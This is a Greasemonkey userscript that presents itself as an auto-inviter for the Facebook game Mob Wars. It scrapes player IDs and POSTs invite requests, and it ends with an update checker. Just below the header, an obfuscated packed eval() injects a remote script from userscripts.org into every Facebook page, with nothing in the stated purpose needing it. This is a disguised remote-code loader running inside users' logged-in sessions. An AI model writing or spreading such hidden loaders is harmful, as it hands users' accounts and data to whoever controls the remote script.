// ==UserScript==
// @name           Create mobwars invites Plus.
// @namespace      Mobwars friends.
// @description    Automatically invites people to your mob that you find on the invite page.
// @include        http://apps.facebook.com/mobwars/fight/
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @include        http://apps.new.facebook.com/mobwars/fight/
// @include        http://apps.facebook.com/mobwars/mob/
// @include        http://apps.new.facebook.com/mobwars/mob/
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



document.getElementByXPath = function(sValue) { var a = this.evaluate(sValue, this, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null); if (a.snapshotLength > 0) { return a.snapshotItem(0); } };
document.getElementsByXPath = function(sValue){ var aResult = new Array();var a = this.evaluate(sValue, ((arguments.lenth > 1) ? arguments[1] : this), null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);for ( var i = 0 ; i < a.snapshotLength ; i++ ){aResult.push(a.snapshotItem(i));}return aResult;};

//Check if we're using the new or old layout
var newlayout = false
if (document.location.href.indexOf('apps.new.facebook.com') != -1) 
	newlayout = true;

//Grab the last known request form ID
var reqID = GM_getValue('reqformID',false);

//Get unix epoch time
var now = Math.floor(new Date().getTime() / 1000);

//Set how long its been since we've grabbed an ID last time.
var since = now - GM_getValue('getID',0);

//If we don't have a reqID or its older than a day, grab a fresh one.
if ((!reqID || since > 86400) && document.location.href.indexOf('fight') != -1) {
	document.location.href = 'http://apps.'+((newlayout)?'new.':'')+'facebook.com/mobwars/mob/';
	return;
}

if (document.location.href.indexOf('fight') == -1) {
	Array.forEach(document.getElementsByTagName("input"),
		function(obj){
			if (obj.id.indexOf('mfs_typeahead_req_form_') != -1) {
				GM_setValue('reqformID',obj.id.replace('mfs_typeahead_req_form_',''));
				GM_setValue('getID',now);
			}
		}
	);
}
else {
	var vars = false;
	var members = document.getElementsByXPath("//a[contains(@href,'/mobwars/profile/?user_id=')]");
	//First link is always yourself from the 'my stats' link at the top
	members.shift();
	Array.forEach(members,
		function(member){
			var mobid = member.href.match(/\d+$/);
			vars = vars + '&ids%5B%5D=' + mobid;
		}
	);
	if (vars) {
		vars = reqID + '=Start+Typing+a+Friend%27s+Name' + vars;
		GM_xmlhttpRequest({
			method: "POST",
			url: 'http://apps.'+((newlayout)?'new.':'')+'facebook.com/mobwars/mob/do.php',
			headers:{'Content-type':'application/x-www-form-urlencoded'},
			data:vars,
			onload: function(xhr) { }
	  });
	}
}

var version_timestamp = 1218839311337;
/***
 * Function: Script Update Checker
 *
 * Description:
 * Script Update Checker (http://userscripts.org/scripts/show/20145)
 * written by Jarett (http://userscripts.org/users/38602).
 */
function updateCheck(forced){if((forced)||(parseInt(GM_getValue("lastUpdate","0"))+86400000<=(new Date().getTime()))){try{GM_xmlhttpRequest({method:"GET",url:"http://userscripts.org/scripts/review/30725?"+new Date().getTime(),headers:{'Cache-Control':'no-cache'},onload:function(xhrResponse){GM_setValue("lastUpdate",new Date().getTime()+"");var rt=xhrResponse.responseText.replace(/&nbsp;?/gm," ").replace(/<li>/gm,"\n").replace(/<[^>]*>/gm,"");var scriptName=(/@name\s*(.*?)\s*$/m.exec(rt))[1];GM_setValue("targetScriptName",scriptName);if(parseInt(/version_timestamp\s*=\s*([0-9]+)/.exec(rt)[1])>version_timestamp){if(confirm("There is an update available for the Greasemonkey script \""+scriptName+".\"\nWould you like to go to the install page now?")){GM_openInTab("http://userscripts.org/scripts/show/30725");}}else if(forced){alert("No update is available for \""+scriptName+".\"");}}});}catch(err){if(forced){alert("An error occurred while checking for updates:\n"+err);}}}}GM_registerMenuCommand(GM_getValue("targetScriptName","???")+" - Manual Update Check",function(){updateCheck(true);});updateCheck(false);